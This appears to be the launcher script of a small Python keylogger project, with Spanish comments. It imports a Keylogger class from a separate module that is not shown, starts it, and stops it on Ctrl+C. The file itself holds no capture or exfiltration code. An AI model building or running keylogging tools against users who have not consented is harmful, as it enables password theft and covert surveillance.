from keylogger import Keylogger
import signal
from termcolor import colored
import sys


def signal_handler(signal,frame):#esto es para que cuando se presione ctrl+c se detenga el programa
    print(colored("\n Saliendo... \n","red"))
    my_keylogger.shutdown()
    sys.exit(1)

signal.signal(signal.SIGINT,signal_handler)



if __name__ == "__main__":
     my_keylogger = Keylogger() # Define my_keylogger before using it
     my_keylogger.start()